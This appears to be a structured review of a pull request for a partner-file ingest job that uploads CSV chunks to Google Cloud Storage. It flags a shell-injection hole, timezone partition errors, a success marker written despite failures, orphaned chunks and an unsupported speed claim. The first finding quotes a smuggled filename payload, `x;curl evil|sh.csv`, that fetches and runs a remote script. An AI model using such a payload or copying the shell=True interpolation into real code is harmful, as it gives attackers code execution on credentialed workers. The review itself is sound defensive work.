attacks.claim: Partner-controlled filenames (src.stem, local.name) are interpolated into a shell=True command string. A filename like `x;curl evil|sh.csv` or with $(...) yields command execution on a worker holding GCS write credentials for the whole raw bucket.
attacks.evidence: subprocess.run(f"gsutil -q ... cp {local} {dest}", shell=True, check=True) with src.stem derived from partner-chosen SFTP filenames

attacks.claim: partition_date now uses local time (America/Los_Angeles) instead of UTC. At 01:30 UTC the LA date is the previous day, so data lands in the wrong dt partition, and downstream dashboards read UTC-date partitions. Data is missing from today's partition and written into yesterday's, possibly overwriting.
attacks.evidence:
-    return datetime.now(timezone.utc).strftime("%Y-%m-%d")
+    return datetime.now().strftime("%Y-%m-%d")  / Workers run with TZ=America/Los_Angeles ... scheduled at 01:30 UTC

attacks.claim: Failed files are swallowed, yet _SUCCESS is written unconditionally, even when all files failed or a file was partially uploaded (some chunks uploaded, then exception). Dashboards consume the partition as soon as the marker appears, so partial or empty data is published as complete, and the job task still succeeds so Airflow never alerts.
attacks.evidence: except Exception: log.exception(...); failed += 1 ... write_success_marker(BUCKET, f"raw/{partner}/dt={dt}/") regardless of failed

attacks.claim: No retry/idempotency: a partially failed file leaves orphan chunks in GCS and local work_dir (chunk.unlink only on success). A rerun mixes old and new chunks. No failure exit status, and no timeout on subprocess.
attacks.evidence: chunk.unlink() only inside the try after upload; subprocess.run without timeout; no cleanup on exception

attacks.claim: Output layout and format changed: objects now go under raw/{partner}/dt=/{stem}/{stem-000N}.csv.gz instead of raw/{partner}/dt=/{stem}.csv.gz, which can break downstream readers. Also the header is derived from the first normalised row per chunk, and the DictReader yields ragged rows (None keys) that DictWriter would not handle consistently. The PR says 'unchanged' only for the normaliser.

Signature of ingest_partner changed (new required work_dir param) with no visible caller update in the diff, and no tests are included. Also a dependency on the gsutil CLI (deprecated in favor of gcloud storage) is added.
attacks.evidence: def ingest_partner(partner: str, drop_dir: Path, work_dir: Path) -> None

attacks.claim: Performance claim for gsutil parallel composite uploads is unsupported, and the chunks are ~500k rows, likely gzip-compressed to sizes below the 150M threshold, so composite upload may never trigger.
attacks.evidence: parallel composite uploads are much faster than the client library for multi-GB objects
